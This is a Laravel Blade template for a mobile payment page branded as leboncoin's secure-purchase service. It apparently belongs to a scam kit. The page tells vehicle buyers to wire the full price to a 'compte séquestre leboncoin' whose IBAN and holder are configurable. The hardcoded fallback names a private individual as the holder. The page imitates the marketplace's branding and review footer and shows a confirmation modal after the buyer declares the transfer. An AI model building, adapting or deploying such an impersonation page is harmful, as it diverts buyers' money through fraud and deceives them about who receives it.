@php
    $refCode   = 'LBC-' . strtoupper(substr(md5((string)$ad->id . ($ad->share_token ?? '')), 0, 8));
    $fmtTotal  = $total == intval($total)
        ? number_format((float)$total, 0, ',', ' ').' €'
        : number_format((float)$total, 2, ',', ' ').' €';
    $ibanFmt   = $bankAccount?->iban
        ? trim(chunk_split(preg_replace('/\s+/', '', $bankAccount->iban), 4, ' '))
        : 'FR76 1621 8000 0140 1213 9940 653';
    $bic       = $bankAccount?->bic ?? 'BFBKFRP1';
    $titulaire = $bankAccount?->account_holder_name ?? 'SANDY PRIGENT';
@endphp
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>Déposer vos fonds — {{ $ad->title }}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com"/>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet"/>
    <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { font-size: 16px; }
    body { font-family: 'Nunito Sans', 'Inter', sans-serif; background: #fff; color: rgb(21,34,51); min-height: 100vh; }
    a { text-decoration: none; color: inherit; }
    button, input { font-family: inherit; }

    .page { max-width: 430px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; background: #fff; }

    /* ── Topbar ── */
    .topbar {
        position: sticky; top: 0; z-index: 20;
        background: #fff; height: 52px;
        display: flex; align-items: center;
        padding: 0 12px; flex-shrink: 0;
        box-shadow: 0 2px 4px rgba(170,170,170,.35);
    }
    .topbar-back {
        position: absolute; left: 8px;
        width: 36px; height: 36px;
        display: flex; align-items: center; justify-content: center;
        background: transparent; border: none; cursor: pointer; padding: 0;
    }
    .topbar-back svg { width: 24px; height: 24px; stroke: rgb(11,28,83); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
    .topbar-center {
        flex: 1;
        display: flex; align-items: center; justify-content: center; gap: 7px;
        font-family: 'Nunito Sans', sans-serif;
        font-size: 18px; font-weight: 800; color: rgb(11,28,83);
    }
    .topbar-center svg { width: 20px; height: 20px; flex-shrink: 0; }

    /* ── Barre de progression ── */
    .progress { height: 5px; background: rgb(212,215,228); width: 100%; flex-shrink: 0; }
    .progress-fill { height: 100%; width: 89%; background: rgba(11,28,83,.8); transition: width .3s; }

    /* ── Contenu ── */
    .content { padding: 20px 18px 0; display: flex; flex-direction: column; }

    /* Hero illustration */
    .hero { padding: 6px 0 18px; }
    .hero img { width: 100%; max-width: 250px; height: auto; display: block; }

    .h1 {
        font-size: 21px; font-weight: 800; color: rgb(21,34,51);
        line-height: 1.35; margin-bottom: 22px;
    }
    .h2 { font-size: 17px; font-weight: 800; color: rgb(21,34,51); margin-bottom: 20px; }

    /* ── Steps avec connecteur vertical ── */
    .step { display: flex; gap: 12px; align-items: flex-start; }
    .step-col { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; }
    .step-num {
        width: 26px; height: 26px; border-radius: 50%;
        background: rgb(236,90,19); color: #fff;
        font-size: 14px; font-weight: 800;
        display: flex; align-items: center; justify-content: center;
    }
    .step-line { width: 1px; flex: 1; min-height: 22px; background: rgb(199,199,199); margin-top: 4px; }
    .step-body { flex: 1; min-width: 0; padding-bottom: 22px; }
    .step-txt { font-size: 15px; color: rgb(21,34,51); line-height: 1.4; padding-top: 3px; }

    /* ── Carte RIB ── */
    .rib-card {
        border: 1px solid rgba(107,107,107,.18);
        border-radius: 16px;
        padding: 14px 16px 18px;
        margin-top: 14px;
        display: flex; flex-direction: column; gap: 14px;
    }
    .rib-head {
        display: flex; align-items: center; gap: 8px;
        padding-bottom: 12px;
        border-bottom: 1px solid rgba(107,107,107,.18);
        font-size: 13px; font-weight: 800; color: rgb(21,34,51);
    }
    .rib-head svg { width: 18px; height: 18px; stroke: rgb(21,34,51); fill: none; stroke-width: 2; flex-shrink: 0; }
    .rib-label { font-size: 13px; color: rgb(58,71,87); }
    .rib-value { font-size: 14px; font-weight: 800; color: rgb(21,34,51); margin-top: 1px; }
    .rib-bic-row { display: flex; justify-content: space-between; align-items: center; gap: 10px; }
    .btn-copy {
        display: inline-flex; align-items: center; gap: 7px;
        background: rgb(230,242,253); color: rgb(21,34,51);
        border: none; border-radius: 10px;
        padding: 10px 16px;
        font-size: 14px; font-weight: 800; cursor: pointer;
        flex-shrink: 0;
    }
    .btn-copy svg { width: 16px; height: 16px; stroke: rgb(21,34,51); fill: none; stroke-width: 2; }

    /* ── Boîte prix verte ── */
    .price-box {
        background: rgb(224,242,233);
        border-radius: 16px;
        padding: 16px;
        margin-top: 12px;
        display: flex; justify-content: space-between; align-items: center; gap: 12px;
    }
    .price-box span { font-size: 15px; font-weight: 800; color: rgb(29,99,64); }

    /* ── Encadré gris délai ── */
    .delay-box {
        background: rgb(240,242,245);
        border-radius: 16px;
        padding: 18px;
        margin: 8px 0 26px;
        display: flex; gap: 10px; align-items: flex-start;
    }
    .delay-box svg { width: 16px; height: 16px; flex-shrink: 0; margin-top: 2px; stroke: rgb(58,71,87); fill: none; stroke-width: 2; }
    .delay-title { font-size: 14px; font-weight: 800; color: rgb(58,71,87); margin-bottom: 4px; }
    .delay-txt   { font-size: 13.5px; color: rgb(15,24,37); line-height: 1.45; }

    /* ── Lien + bouton ── */
    .cancel-link {
        display: block;
        font-size: 15px; font-weight: 800; color: rgb(21,34,51);
        text-decoration: underline;
        margin-bottom: 18px; cursor: pointer;
    }
    .btn-virement {
        display: inline-flex; align-items: center; justify-content: center;
        background: rgb(236,90,19); color: #fff;
        border: none; border-radius: 14px;
        padding: 13px 22px;
        font-size: 16px; font-weight: 800; cursor: pointer;
        align-self: flex-start;
        margin-bottom: 30px;
        transition: opacity .15s;
    }
    .btn-virement:active { opacity: .85; }

    /* ── FAQ ── */
    .faq-wrap { display: flex; flex-direction: column; gap: 10px; padding-bottom: 34px; }
    .faq-item { background: rgb(244,249,254); border-radius: 12px; overflow: hidden; }
    .faq-q {
        width: 100%; background: transparent; border: none; cursor: pointer;
        display: flex; align-items: center; justify-content: space-between; gap: 10px;
        padding: 15px 16px;
        font-size: 14px; font-weight: 800; color: rgb(58,71,87);
        text-align: left; line-height: 1.4;
    }
    .faq-q svg { flex-shrink: 0; transition: transform .2s; width: 18px; height: 18px; stroke: rgb(21,34,51); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
    .faq-item.open .faq-q svg { transform: rotate(180deg); }
    .faq-a { display: none; padding: 0 16px 15px; font-size: 13px; color: rgb(45,55,72); line-height: 1.5; }
    .faq-item.open .faq-a { display: block; }

    /* ── Footer ── */
    .footer {
        background: rgb(43,52,65); color: #fff;
        padding: 18px 16px;
        display: flex; align-items: center; justify-content: space-between; gap: 10px;
        font-size: 14px;
    }
    .footer-stars { display: flex; align-items: center; gap: 6px; font-size: 12px; }
    .footer-stars .stars { display: flex; gap: 2px; }
    .footer-stars .star { width: 16px; height: 16px; background: rgb(0,182,122); display: flex; align-items: center; justify-content: center; }

    /* ── Modal Bravo ── */
    .bravo-overlay {
        display: none;
        position: fixed; inset: 0; z-index: 99999;
        background: rgba(0,0,0,.5);
        align-items: center; justify-content: center;
        padding: 20px;
    }
    .bravo-overlay.open { display: flex; }
    .bravo-modal {
        background: #fff; border-radius: 18px;
        padding: 18px 22px 26px;
        max-width: 340px; width: 100%;
        box-shadow: 0 20px 60px rgba(0,0,0,.3);
        position: relative;
        max-height: 90vh; overflow-y: auto;
    }
    .bravo-close {
        position: absolute; top: 12px; right: 12px;
        width: 30px; height: 30px;
        background: transparent; border: none; cursor: pointer;
        display: flex; align-items: center; justify-content: center;
    }
    .bravo-close svg { width: 20px; height: 20px; stroke: rgb(21,34,51); fill: none; stroke-width: 2.5; stroke-linecap: round; }
    .bravo-hero { display: flex; justify-content: center; padding: 8px 0 14px; }
    .bravo-hero img { width: 180px; height: auto; }
    .bravo-title {
        font-size: 19px; font-weight: 800; color: rgb(21,34,51);
        line-height: 1.35; margin-bottom: 18px;
    }
    .bravo-step { display: flex; gap: 10px; align-items: flex-start; }
    .bravo-step-col { display: flex; flex-direction: column; align-items: center; flex-shrink: 0; }
    .bravo-dot {
        width: 9px; height: 9px; border-radius: 50%;
        background: rgb(236,90,19); margin-top: 5px;
    }
    .bravo-line { width: 1px; flex: 1; min-height: 14px; background: rgb(220,220,220); margin-top: 3px; }
    .bravo-step-txt { flex: 1; font-size: 13px; color: rgb(90,98,110); line-height: 1.5; padding-bottom: 16px; }
    .bravo-btn-wrap { display: flex; justify-content: flex-end; margin-top: 4px; }
    .btn-compris {
        background: rgb(236,90,19); color: #fff;
        border: none; border-radius: 12px;
        padding: 11px 18px;
        font-size: 14px; font-weight: 800; cursor: pointer;
    }
    </style>
</head>
<body>
<div class="page">

    {{-- ── Topbar ── --}}
    <div class="topbar">
        <button class="topbar-back" onclick="history.back()" type="button" aria-label="Retour">
            <svg viewBox="0 0 24 24"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
        </button>
        <div class="topbar-center">
            <svg viewBox="0 0 24 24" fill="none" stroke="rgb(11,28,83)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 2l8 3v6c0 5-3.5 9.4-8 11-4.5-1.6-8-6-8-11V5l8-3z"/>
                <text x="12" y="14.5" text-anchor="middle" font-size="9" font-weight="700" fill="rgb(11,28,83)" stroke="none">€</text>
            </svg>
            Achat sécurisé
        </div>
    </div>

    {{-- ── Progression ── --}}
    <div class="progress"><div class="progress-fill"></div></div>

    <div class="content">

        {{-- Illustration --}}
        <div class="hero">
            <img src="/reserve/money-in-the-bank.avif" alt="" aria-hidden="true"/>
        </div>

        <div class="h1">Déposer vos fonds sur votre compte sécurisé leboncoin</div>

        <div class="h2">Comment procéder ?</div>

        {{-- Étape 1 --}}
        <div class="step">
            <div class="step-col">
                <div class="step-num">1</div>
                <div class="step-line"></div>
            </div>
            <div class="step-body">
                <div class="step-txt">Je me connecte à mon compte bancaire</div>
            </div>
        </div>

        {{-- Étape 2 --}}
        <div class="step">
            <div class="step-col">
                <div class="step-num">2</div>
                <div class="step-line"></div>
            </div>
            <div class="step-body">
                <div class="step-txt">J'ajoute le RIB leboncoin à mes bénéficiaires :</div>

                <div class="rib-card">
                    <div class="rib-head">
                        <svg viewBox="0 0 24 24"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
                        RIB Compte séquestre leboncoin
                    </div>
                    <div>
                        <div class="rib-label">Titulaire</div>
                        <div class="rib-value">{{ $titulaire }}</div>
                    </div>
                    <div>
                        <div class="rib-label">IBAN</div>
                        <div class="rib-value" id="ibanValue">{{ $ibanFmt }}</div>
                    </div>
                    <div class="rib-bic-row">
                        <div>
                            <div class="rib-label">BIC</div>
                            <div class="rib-value">{{ $bic }}</div>
                        </div>
                        <button class="btn-copy" type="button" id="btnCopy">
                            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 012-2h10"/></svg>
                            <span id="copyLabel">Copier IBAN</span>
                        </button>
                    </div>
                    <div>
                        <div class="rib-label">Référence à indiquer</div>
                        <div class="rib-value">{{ $refCode }}</div>
                    </div>
                </div>
            </div>
        </div>

        {{-- Étape 3 --}}
        <div class="step">
            <div class="step-col">
                <div class="step-num">3</div>
                <div class="step-line"></div>
            </div>
            <div class="step-body">
                <div class="step-txt">J'effectue le virement correspondant à la somme négociée en amont ou le prix de base :</div>
                <div class="price-box">
                    <span>Prix du véhicule</span>
                    <span>{{ $fmtTotal }}</span>
                </div>
            </div>
        </div>

        {{-- Étape 4 --}}
        <div class="step">
            <div class="step-col">
                <div class="step-num">4</div>
            </div>
            <div class="step-body" style="padding-bottom:14px;">
                <div class="step-txt">Je suis notifié(e) lorsque mes fonds sont bien arrivés.</div>
            </div>
        </div>

        {{-- Encadré délai --}}
        <div class="delay-box">
            <svg viewBox="0 0 24 24" stroke-linecap="round"><path d="M9 18h6M10 21h4M12 3a6 6 0 00-4 10.5c.6.6 1 1.5 1 2.5h6c0-1 .4-1.9 1-2.5A6 6 0 0012 3z"/></svg>
            <div>
                <div class="delay-title">Votre virement prendra jusqu'à 4 jours ouvrés.</div>
                <div class="delay-txt">Votre banque peut prendre jusqu'à 48h pour valider votre bénéficiaire. Puis sous 2 jours ouvrés vous recevrez vos fonds sur votre compte leboncoin et nous vous en tiendrons informé.</div>
            </div>
        </div>

        {{-- Lien + bouton --}}
        <a class="cancel-link" href="{{ url()->previous() }}">Je ne souhaite plus acheter ce véhicule</a>
        <button class="btn-virement" type="button" id="btnVirement">J'ai fait mon virement</button>

        {{-- FAQ --}}
        <div class="faq-wrap">
            <div class="faq-item">
                <button class="faq-q" type="button" onclick="this.parentElement.classList.toggle('open')">
                    Combien de temps prend le virement ?
                    <svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg>
                </button>
                <div class="faq-a">Comptez jusqu'à 4 jours ouvrés au total : jusqu'à 48h pour la validation du bénéficiaire par votre banque, puis 2 jours ouvrés pour la réception des fonds sur votre compte séquestre leboncoin.</div>
            </div>
            <div class="faq-item">
                <button class="faq-q" type="button" onclick="this.parentElement.classList.toggle('open')">
                    Comment payer le vendeur ensuite ?
                    <svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"/></svg>
                </button>
                <div class="faq-a">Une fois vos fonds arrivés, vous organisez un rendez-vous avec le vendeur. Lors de la remise des clés, vous débloquez les fonds depuis votre espace leboncoin et le vendeur est payé instantanément.</div>
            </div>
        </div>

    </div>

    {{-- ── Footer ── --}}
    <div class="footer">
        <span>leboncoin 2006 - {{ date('Y') }}</span>
        <span class="footer-stars">
            <span class="stars">
                @for($i = 0; $i < 4; $i++)
                <span class="star"><svg width="11" height="11" viewBox="0 0 24 24" fill="#fff"><path d="M12 2l2.9 6.6 7.1.6-5.4 4.7 1.6 7-6.2-3.7-6.2 3.7 1.6-7L2 9.2l7.1-.6L12 2z"/></svg></span>
                @endfor
                <span class="star" style="background:rgb(70,80,95);"><svg width="11" height="11" viewBox="0 0 24 24" fill="#fff"><path d="M12 2l2.9 6.6 7.1.6-5.4 4.7 1.6 7-6.2-3.7-6.2 3.7 1.6-7L2 9.2l7.1-.6L12 2z"/></svg></span>
            </span>
            263656 avis su
        </span>
    </div>

</div>

{{-- ── Modal Bravo ── --}}
<div class="bravo-overlay" id="bravoOverlay">
    <div class="bravo-modal">
        <button class="bravo-close" type="button" onclick="document.getElementById('bravoOverlay').classList.remove('open')" aria-label="Fermer">
            <svg viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>
        </button>

        <div class="bravo-hero">
            <img src="/reserve/money-in-the-bank.avif" alt="" aria-hidden="true"/>
        </div>

        <div class="bravo-title">Bravo !<br/>Voici les prochaines étapes</div>

        <div class="bravo-step">
            <div class="bravo-step-col">
                <div class="bravo-dot"></div>
                <div class="bravo-line"></div>
            </div>
            <div class="bravo-step-txt">Vous recevrez une notification quand votre virement sera arrivé sur le compte leboncoin.</div>
        </div>
        <div class="bravo-step">
            <div class="bravo-step-col">
                <div class="bravo-dot"></div>
                <div class="bravo-line"></div>
            </div>
            <div class="bravo-step-txt">Alors, vous pourrez organiser un rendez-vous avec le vendeur pour procéder au paiement et à la remise des clés. À ce stade, il sera toujours possible de négocier le prix ou d'annuler la transaction.</div>
        </div>
        <div class="bravo-step">
            <div class="bravo-step-col">
                <div class="bravo-dot"></div>
            </div>
            <div class="bravo-step-txt" style="padding-bottom:6px;">Après la vente, vous pourrez finaliser la souscription de votre garantie panne mécanique. Le paiement de celle-ci se fera à la finalisation de la souscription.</div>
        </div>

        <div class="bravo-btn-wrap">
            <button class="btn-compris" type="button" onclick="document.getElementById('bravoOverlay').classList.remove('open')">J'ai compris !</button>
        </div>
    </div>
</div>

<script>
const LBC = {
    iban: @json(preg_replace('/\s+/', '', $ibanFmt)),
    plan: @json($planKey ?? 'sans_garantie'),
    total: {{ (float)$total }},
    ref: @json($refCode),
    declareUrl: @json(route('ads.reserve.virement.declare', $ad)),
    csrf: @json(csrf_token())
};

/* ── Copier IBAN ── */
document.getElementById('btnCopy').addEventListener('click', function() {
    const label = document.getElementById('copyLabel');
    function done() { label.textContent = 'Copié !'; setTimeout(() => label.textContent = 'Copier IBAN', 2000); }
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(LBC.iban).then(done).catch(() => {});
    } else {
        const ta = document.createElement('textarea');
        ta.value = LBC.iban;
        ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
        document.body.appendChild(ta); ta.select();
        try { document.execCommand('copy'); done(); } catch(e) {}
        document.body.removeChild(ta);
    }
});

/* ── J'ai fait mon virement → déclaration + modal Bravo ── */
document.getElementById('btnVirement').addEventListener('click', function() {
    fetch(LBC.declareUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': LBC.csrf },
        body: JSON.stringify({ plan: LBC.plan, amount: LBC.total, reference: LBC.ref })
    }).catch(() => {});
    document.getElementById('bravoOverlay').classList.add('open');
});
</script>
</body>
</html>
